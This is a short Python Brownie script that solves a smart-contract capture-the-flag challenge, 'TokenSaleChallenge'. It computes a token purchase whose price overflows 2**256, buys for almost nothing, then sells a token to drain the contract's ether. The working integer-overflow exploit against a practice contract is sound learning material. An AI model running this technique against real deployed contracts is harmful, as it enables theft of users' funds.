import math
from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    TokenSaleChallenge
)
from scripts.helpful_scripts import (
    get_account,
    get_challenge_contract,
    check_solution,
)
from web3 import Web3


def main():
    player = get_account("player")
    challenge_contract = get_challenge_contract(
        TokenSaleChallenge, "token_sale", [player], {"from": player, "value": Web3.toWei(1.0, "ether")}
    )

    num_tokens = (2 ** 256) // (10 ** 18) + 1
    num_wei = (num_tokens * (10 ** 18)) % (2 ** 256)
    print('Number of tokens:', num_tokens)
    print('Price of these tokens:', Web3.fromWei(num_wei, "ether"), "ETH")
    print()

    tx = challenge_contract.buy(num_tokens, {"from": player, "value": Web3.toWei(num_wei, "wei")})
    tx.wait(1)
    tx = challenge_contract.sell(1, {"from": player})
    tx.wait(1)

    check_solution(challenge_contract.address)